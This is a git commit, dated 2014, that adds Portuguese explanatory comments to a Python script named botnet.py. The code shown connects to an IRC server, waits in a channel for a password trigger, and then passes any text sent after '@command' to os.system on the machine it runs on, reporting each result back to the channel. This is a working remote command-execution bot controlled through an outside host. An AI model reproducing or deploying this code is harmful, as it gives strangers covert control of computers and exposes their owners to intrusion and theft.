728ba8652cc63a4aa6841a40d01485f06e47c293
Marcos <marcosrodriguesdecarvalho@gmail.com>
2014-11-28 23:52:51 -0200

    Algumas partes do código foram comentadas para facilitar a compreensão

--- botnet.py
+++ botnet.py
@@ -5,16 +5,20 @@
 # por: Marcos Rodrigues de Carvalho
 # nickname: warlock
 # VOL: www.vivaolinux.com.br/~marcos_warlock 
+# distribuição Gnu/Linux: Slackware 14.1
 #############################################
 
 import socket, os, time
 from re import search
 
+#Configuração do servidor IRC
 server = 'irc.freenode.net'
 porta = 6667
 canal = '#testeprogramaboot'
 nick = 'controle'
 password = 'senha1234'
+
+# Cria o servidor socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((server, porta))
 s.send('NICK %s\r\n' %nick)
@@ -23,6 +27,9 @@ s.send('Join %s\r\n' %canal)
 time.sleep(2)
 print (s.recv(1024))
 
+#Verifica o que é digitado no canal
+# Se for digitado "@ligar + senha", o status da variável teste passa para True
+# Se não o status da variável permanece False.
 teste = False
 while teste != True:
     msg = s.recv(5000)
@@ -32,6 +39,12 @@ while teste != True:
     if search('@ligar %s' %password, msg):
         teste = True
         s.send('PRIVMSG %s : Conectado com sucesso!\r\n' %canal)
+
+# Verifica o que é digitado no canal        
+# Se for digitado "@command + comando", o programa executa o comando informado no 
+# servidor que está rodando o botnet
+# EXEMPLO: @command clear
+# EXPLICAÇÃO: Será executado o comando clear que limpará a tela.
 while True:
     msg = s.recv(5000)
     print (msg)
@@ -42,7 +55,6 @@ while True:
         msg = msg[1].split('\r\n')
         os.system(msg[0])
         s.send('PRIVMSG %s : Comando [ %s ] executado com sucesso!\r\n' %(canal, str(msg[0])))
-
 
 
 
